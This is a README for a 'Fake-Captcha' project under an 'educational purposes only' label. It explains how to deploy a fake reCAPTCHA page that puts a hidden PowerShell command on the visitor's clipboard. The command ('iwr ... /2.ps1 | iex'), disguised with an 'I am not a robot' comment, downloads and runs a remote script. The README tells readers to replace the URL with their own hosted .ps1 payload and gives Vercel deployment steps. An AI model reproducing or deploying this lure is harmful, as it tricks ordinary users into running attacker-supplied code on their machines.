# Educational Purposes Only

I will not show you how to make the powershell script (as its illegal)




# Go to captcha.html

go to this line:

const commandToCopy = `powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command "iwr '${window.location.origin}/2.ps1' -UseBasicParsing | iex # ✔ I am not a robot - reCAPTCHA Verification ID: ${verificationId}

# and replace "${window.location.origin}/2.ps1" 
with your own link with a .ps1 file hosted or keep it the same if the file is hosted on the same domain as the website your on (you can change /2.ps1 with anything (example: /verify) or anything like that (pretty sure it will still work)


# if you want to see what the sites look like
download this [Latest](https://github.com/vxcnnn/Fake-Captcha/archive/refs/heads/main.zip) and open the thing in cmd and type "npm install vercel" and then do "vercel" and set everything up then do "vercel --prod" and go to the link



chatgpt code (used just to combine everything in 1, as i was lazy)
